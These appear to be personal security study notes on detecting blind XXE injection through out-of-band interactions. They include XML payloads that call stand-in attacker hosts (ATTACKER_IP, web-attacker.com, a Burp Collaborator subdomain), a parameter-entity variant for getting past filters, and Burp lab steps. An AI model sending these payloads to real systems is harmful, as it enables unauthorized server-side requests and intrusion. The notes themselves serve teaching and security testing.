Detecting blind XXE can be done by using the same technique as [XXE to SSRF attacks](obsidian://open?vault=security-notes&file=Offensive%20Security%2FWeb%20Application%20Security%2FVulnerabilities%20%26%20Attacks%2FXXE%20Injection%2FCommon%20XXE%20Attacks%2FChained%20XXE%20to%20SSRF), but triggering the out-of-band network interaction to a system that an attacker control. For example, an attacker can define an external entity as follows:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://ATTACKER_IP:ATTACKER_PORT/"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```
This attack will cause the server to make HTTP request to the specified URL which the attacker can monitor for the resulting DNS lookup and HTTP request, and thereby confirming a successful blind XXE.

1. In Burp Proxy, intercept the request and modify the XML in the request body with the following:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```
2. Right click and select **Insert Collaborator payload**  to insert a Burp Collaborator subdomain where indicated.
3. Go to the Collaborator tab, and click **Poll now**. If you don't see any interactions listed, wait a few seconds and try again. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.
> Note: If Burp Collaborator is not available, we can use [CanaryTokens](https://canarytokens.org/generate#) and [interactsh](https://github.com/projectdiscovery/interactsh) as alternatives.
## Out-of-band Interaction via XML Parameter Entities
Sometimes, XXE attacks using regular entities are blocked due to input validation by the application or some hardening of the XML parser that is being used. In this situation, an attacker might use XML parameter entities instead, which are a special kind of XML entity which can only be reference within the DTD.

For this technique, an attacker only need to know two things:
1. The declaration of an XML parameter entity includes the percent character before the entity name: `<!ENTITY % myparameterentity "my parameter entity value" >`
2. Parameter entities are referenced using the **percent character (%)** instead of the usual ampersand (&): `%myparameterentity;`

This means, an attacker can test for blind XXE with the following payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
<stockCheck><productId>299</productId></stockCheck>
```